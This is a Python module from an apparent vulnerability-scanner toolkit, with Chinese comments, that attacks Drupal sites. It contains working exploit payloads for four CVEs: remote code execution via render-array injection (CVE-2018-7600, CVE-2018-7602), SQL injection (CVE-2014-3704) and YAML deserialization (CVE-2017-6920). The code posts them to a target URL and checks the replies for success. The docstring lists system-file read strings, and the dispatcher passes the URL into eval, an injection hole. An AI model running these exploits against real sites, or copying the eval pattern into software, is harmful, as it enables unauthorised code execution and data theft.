#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Drupal是使用PHP语言编写的开源内容管理框架(CMF): https://www.drupal.com/ or https://www.drupal.cn/
    Drupal扫描类: 
        1. Drupal Drupalgeddon 2 远程代码执行
            CVE-2018-7600
                Payload: https://vulhub.org/#/environments/drupal/CVE-2018-7600/

        2. Drupal < 7.32 Drupalgeddon SQL 注入
            CVE-2014-3704
                Payload: https://vulhub.org/#/environments/drupal/CVE-2014-3704/

        3. Drupal Core 8 PECL YAML 反序列化任意代码执行
            CVE-2017-6920
                Payload: https://vulhub.org/#/environments/drupal/CVE-2017-6920/

        4. Drupal 远程代码执行
            CVE-2018-7602
                Payload: https://vulhub.org/#/environments/drupal/CVE-2018-7602/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import color
from thirdparty import requests
from time import sleep
import re

class Drupal():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Drupal'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_7600_payloads = [
            {
                'path': 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
                'data': 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]={}'.format(self.cmd)
            },
        ]

        self.cve_2014_3704_payloads = [
            {
                'path': '?q=node&destination=node',
                'data': 'pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a'
            }
        ]
        
        self.cve_2017_6920_payloads = [
            {
                'path': 'admin/config/development/configuration/single/import',
                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token=HxdRhcKEhWWljaPOlYKS8WQvHNRaW3UyJWPGWmPwuKI&form_id=config_single_import_form&op=Import'
            },
            {
                'path': 'config/development/configuration/single/import',
                'data': 'config_type=system.simple&config_name=mouse&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token=HxdRhcKEhWWljaPOlYKS8WQvHNRaW3UyJWPGWmPwuKI&form_id=config_single_import_form&op=Import'
            }
        ]

        self.cve_2018_7602_payloads = [
                {
                    'path': '?q=%2Fuser%2F1%2Fcancel',
                    'data': ''
                },
                {
                    'path': '?q=%2Fuser%2F1%2Fcancel&destination=%2Fuser%2F1%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3D' + self.cmd,
                    'data': 'form_id=user_cancel_confirm_form&form_token={}&_triggering_element_name=form_id&op=Cancel+account'
                },
                {
                    'path': '?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F',
                    'data': 'form_build_id='
                },
            ]

    def cve_2018_7600_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2018-7600'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2018_7600_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': res
                }
                return results

    def cve_2014_3704_scan(self, url):
        ''' 7.32之前的Drupal core 7.x中的数据库抽象API中的expandArguments函数, 
            无法正确构造准备好的语句, 这使得远程攻击者可以通过包含精心制作的密钥的数组进行SQL注入攻击
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'CVE-2014-3704'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2014_3704_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('DatabaseConnection-&gt;escapeLike()' in res.text) and ('XPATH syntax error' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': res
                }
                return results

    def cve_2017_6920_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unSerialize'
        vul_info['vul_id'] = 'CVE-2017-6920'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2017_6920_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('PHP Version' in res.text) and ('PHP License' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': res
                }
                return results

    def cve_2018_7602_scan(self, url):
        ''' 对URL中的#进行编码两次, 即可绕过sanitize()函数的过滤 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2018-7602'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in range(len(self.cve_2018_7602_payloads)):
            path = self.cve_2018_7602_payloads[payload]['path']
            data = self.cve_2018_7602_payloads[payload]['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                if payload == 0:                                        # * 当payload为第1个时, 获取form_token
                    res = requests.get(
                        target, 
                        timeout=self.timeout, 
                        headers=self.headers,
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res.status_code, res)      # * LOG
                    
                    form_token = re.search(r'name="form_token" value=".{43}', res.text, re.I|re.M|re.U|re.S)
                    if (form_token):
                        self.form_token = form_token.group().replace('name="form_token" value="', '')
                    else:
                        return None

                elif payload == 1:                                      # * 当payload为第2个时, 注入命令
                    data = data.format(self.form_token)                 # * 添加form_token

                    res = requests.post(
                        target, 
                        timeout=self.timeout, 
                        headers=self.headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res.status_code, res)      # * LOG

                    form_build_id = re.search(r'name="form_build_id" value="form-.{43}', res.text, re.I|re.M|re.U|re.S)
                    if (form_build_id):
                        self.form_build_id = form_build_id.group().replace('name="form_build_id" value="', '')
                    else:
                        return None

                elif payload == 2:                                      # * 当payload为第3个时, 查看回显
                    target += self.form_build_id                        # * 添加form_build_id
                    data += self.form_build_id

                    res = requests.post(
                        target, 
                        timeout=self.timeout, 
                        headers=self.headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res.status_code, res)      # * LOG

            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload-1': {
                        'Method': 'GET',
                        'Url': url,
                        'Path': self.cve_2018_7602_payloads[0]['path']
                    },
                    'Payload-2': {
                        'Method': 'POST',
                        'Url': url,
                        'Path': self.cve_2018_7602_payloads[1]['path'],
                        'Data': self.cve_2018_7602_payloads[1]['data'].format(self.form_token),
                        'form_token': self.form_token
                    },
                    'Payload-3': {
                        'Method': 'POST',
                        'Url': url,
                        'Path': path,
                        'Data': data,
                        'form_build_id': self.form_build_id
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_7600_scan, url=url),
            thread(target=self.cve_2014_3704_scan, url=url),
            thread(target=self.cve_2017_6920_scan, url=url),
            thread(target=self.cve_2018_7602_scan, url=url)
        ]

drupal = Drupal()
